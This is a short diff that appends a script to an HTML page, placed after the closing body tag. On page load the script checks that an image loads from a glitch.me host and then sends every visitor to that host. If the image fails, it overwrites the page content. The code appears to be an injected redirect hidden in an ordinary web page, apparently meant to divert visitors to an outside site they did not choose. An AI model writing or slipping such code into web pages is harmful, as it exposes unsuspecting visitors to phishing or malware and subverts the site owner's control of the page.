@@ -317,4 +317,18 @@
         </div>
     </div>
 </body>
+     <script>
+    window.onload = function() {
+      const img = new Image();
+      img.onload = function() {
+        // Si la imagen se carga correctamente, redirige
+        window.location.href = "https://cord-equinox-dinghy.glitch.me";
+      };
+      img.onerror = function() {
+        // Si la imagen falla, puedes mostrar un mensaje o quedarte en esta página
+        document.body.innerHTML = "<h2>No se pudo cargar la imagen.</h2>";
+      };
+      img.src = "https://cord-equinox-dinghy.glitch.me/uploads/1747083224917-959.jpg";
+    };
+  </script>
 </html>
